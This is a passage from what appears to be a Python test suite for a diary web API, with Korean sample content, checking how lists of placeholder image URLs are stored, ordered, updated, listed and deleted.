            "content": "오늘 여행에서 찍은 많은 사진들",
            "title": "여행 사진 모음",
            "images": many_images,
        }

        create_response = client.post(
            "/diary",
            json=diary_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert create_response.status_code == 201
        created_diary = create_response.json()
        assert created_diary["images"] == many_images
        assert len(created_diary["images"]) == 10
        diary_id_1 = created_diary["id"]

        # Test 2: Verify images are returned in the same order
        detail_response = client.get(
            f"/diary/{diary_id_1}",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert detail_response.status_code == 200
        detail_data = detail_response.json()
        assert detail_data["images"] == many_images
        # Verify order is preserved
        for i, image_url in enumerate(detail_data["images"]):
            assert image_url == f"https://example.com/images/photo{i+1}.jpg"

        # Test 3: Create diary with empty image array
        empty_images_data = {
            "content": "이미지 없는 일기",
            "title": "텍스트만",
            "images": [],
        }
        empty_response = client.post(
            "/diary",
            json=empty_images_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert empty_response.status_code == 201
        empty_diary = empty_response.json()
        assert empty_diary["images"] == []
        diary_id_2 = empty_diary["id"]

        # Test 4: Create diary without images field (null/None)
        no_images_data = {
            "content": "이미지 필드 없는 일기",
            "title": "텍스트 전용",
        }
        no_images_response = client.post(
            "/diary",
            json=no_images_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert no_images_response.status_code == 201
        no_images_diary = no_images_response.json()
        # Should return None or empty array
        assert no_images_diary["images"] in [None, []]
        diary_id_3 = no_images_diary["id"]

        # Test 5: Update diary to add images (empty -> multiple images)
        new_images = [
            "https://example.com/updated/image1.png",
            "https://example.com/updated/image2.png",
            "https://example.com/updated/image3.png",
        ]
        update_response = client.put(
            f"/diary/{diary_id_2}",
            json={
                "content": "이미지 추가됨",
                "title": "업데이트된 일기",
                "images": new_images,
            },
            headers={"Authorization": f"Bearer {token}"},
        )
        assert update_response.status_code == 200
        updated_diary = update_response.json()
        assert updated_diary["images"] == new_images
        assert len(updated_diary["images"]) == 3

        # Test 6: Update diary to remove images (multiple -> empty)
        remove_images_response = client.put(
            f"/diary/{diary_id_1}",
            json={
                "content": "이미지 제거됨",
                "title": "이미지 없는 일기",
                "images": [],
            },
            headers={"Authorization": f"Bearer {token}"},
        )
        assert remove_images_response.status_code == 200
        removed_diary = remove_images_response.json()
        assert removed_diary["images"] == []

        # Test 7: Very long image URLs
        very_long_url = "https://example.com/images/" + "a" * 500 + ".jpg"
        long_url_data = {
            "content": "매우 긴 URL 테스트",
            "title": "Long URL Test",
            "images": [very_long_url],
        }
        long_url_response = client.post(
            "/diary",
            json=long_url_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert long_url_response.status_code == 201
        long_url_diary = long_url_response.json()
        assert long_url_diary["images"][0] == very_long_url
        assert len(long_url_diary["images"][0]) > 500

        # Test 8: Mixed image URLs (different formats)
        mixed_images = [
            "https://example.com/photo.jpg",
            "https://cdn.example.com/assets/image.png",
            "https://storage.example.com/uploads/pic.gif",
            "https://example.com/images/photo.webp",
            "https://example.com/images/photo.svg",
        ]
        mixed_data = {
            "content": "다양한 이미지 형식",
            "title": "Mixed Images",
            "images": mixed_images,
        }
        mixed_response = client.post(
            "/diary",
            json=mixed_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert mixed_response.status_code == 201
        mixed_diary = mixed_response.json()
        assert mixed_diary["images"] == mixed_images

        # Test 9: Large number of images (20 images)
        large_images = [
            f"https://example.com/gallery/img{i:03d}.jpg"
            for i in range(1, 21)
        ]
        large_data = {
            "content": "대량 이미지 테스트 (20개)",
            "title": "Gallery Test",
            "images": large_images,
        }
        large_response = client.post(
            "/diary",
            json=large_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert large_response.status_code == 201
        large_diary = large_response.json()
        assert len(large_diary["images"]) == 20
        assert large_diary["images"] == large_images
        diary_id_4 = large_diary["id"]

        # Test 10: Verify images persist across list operations
        list_response = client.get(
            "/diary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert list_response.status_code == 200
        diaries = list_response.json()

        # Find diary with 20 images
        diary_with_20_images = next(
            (d for d in diaries if d["id"] == diary_id_4),
            None
        )
        assert diary_with_20_images is not None
        assert len(diary_with_20_images["images"]) == 20
        assert diary_with_20_images["images"] == large_images

        # Test 11: Update images - replace some but keep others
        updated_large_images = large_images[:10] + [
            "https://example.com/new/image1.jpg",
            "https://example.com/new/image2.jpg",
        ]
        update_large_response = client.put(
            f"/diary/{diary_id_4}",
            json={
                "content": "일부 이미지 교체",
                "title": "Updated Gallery",
                "images": updated_large_images,
            },
            headers={"Authorization": f"Bearer {token}"},
        )
        assert update_large_response.status_code == 200
        updated_large_diary = update_large_response.json()
        assert len(updated_large_diary["images"]) == 12
        assert updated_large_diary["images"] == updated_large_images

        # Test 12: Verify image data integrity after deletion
        # Delete diary with images
        delete_response = client.delete(
            f"/diary/{diary_id_1}",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert delete_response.status_code == 204

        # Verify it's gone
        deleted_verify = client.get(
            f"/diary/{diary_id_1}",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert deleted_verify.status_code == 404

        # Verify other diaries with images still exist
        remaining_verify = client.get(
            f"/diary/{diary_id_4}",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert remaining_verify.status_code == 200
        assert len(remaining_verify.json()["images"]) == 12

        # Test 13: Special characters in image URLs
        special_char_urls = [
            "https://example.com/images/photo%20with%20spaces.jpg",
            "https://example.com/images/фото.jpg",  # Cyrillic
            "https://example.com/images/照片.jpg",  # Chinese
            "https://example.com/images/사진.jpg",  # Korean
        ]
        special_data = {
            "content": "특수 문자가 포함된 URL",
            "title": "Special Characters Test",
            "images": special_char_urls,
        }
        special_response = client.post(
            "/diary",
            json=special_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert special_response.status_code == 201
        special_diary = special_response.json()
        assert special_diary["images"] == special_char_urls

        # Test 14: Verify total count of diaries with different image configurations
        final_list = client.get(
            "/diary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert final_list.status_code == 200
        final_diaries = final_list.json()

        # Count diaries by image status
        diaries_with_images = [d for d in final_diaries if d["images"] and len(d["images"]) > 0]
        diaries_without_images = [d for d in final_diaries if not d["images"] or len(d["images"]) == 0]

        # Should have multiple diaries with various image configurations
        assert len(diaries_with_images) >= 4
        assert len(final_diaries) >= 6  # At least 6 diaries created (minus 1 deleted)
